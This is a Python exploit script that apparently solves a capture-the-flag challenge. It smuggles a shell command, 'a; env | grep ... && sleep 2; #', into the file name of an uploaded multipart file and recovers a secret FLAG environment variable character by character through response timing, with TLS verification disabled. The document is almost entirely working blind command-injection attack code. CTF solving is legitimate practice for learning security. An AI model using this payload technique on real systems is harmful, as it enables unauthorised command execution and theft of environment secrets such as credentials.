import requests
import time
import string
import urllib3

# Suppress insecure HTTPS warnings if the CTF uses self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://bc29f45c-3db2-4b74-a2c5-2b4168760f6a.offsec.m0lecon.it/scan"

# We already know the flag format
flag = "offsec{"

# The possible characters inside the flag (alphanumeric, underscores, hyphens, and the closing bracket)
charset = string.ascii_letters + string.digits + "_-}"

print(f"[*] Starting time-based extraction...")
print(f"[*] Known prefix: {flag}")

# Keep looping until we hit the closing bracket
while not flag.endswith("}"):
    for char in charset:
        guess = flag + char
        # Print the current guess on the same line
        print(f"[*] Trying: {guess}", end="\r")
        
        # The payload: grep checks the string. If True, sleep for 2 seconds.
        payload = f"a; env | grep '^FLAG={guess}' && sleep 2; #"
        
        # The 'files' dictionary tells the requests library to format this as multipart/form-data.
        # Format: 'field_name': ('filename', 'file_content', 'content_type')
        files = {
            'specimen': (payload, 'print("dummy data")', 'text/x-python-script')
        }
        
        start_time = time.time()
        
        try:
            # Send the request
            response = requests.post(url, files=files, verify=False)
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Request error: {e}")
            break
            
        elapsed_time = time.time() - start_time
        
        # If the server took 2 seconds or longer, our sleep command executed!
        if elapsed_time >= 2.0:
            flag = guess
            # Print the success and break the inner loop to move to the next character
            print(f"\n[+] Hit! Flag so far: {flag}")
            break

print(f"\n[!] Extraction complete! Final Flag: {flag}")
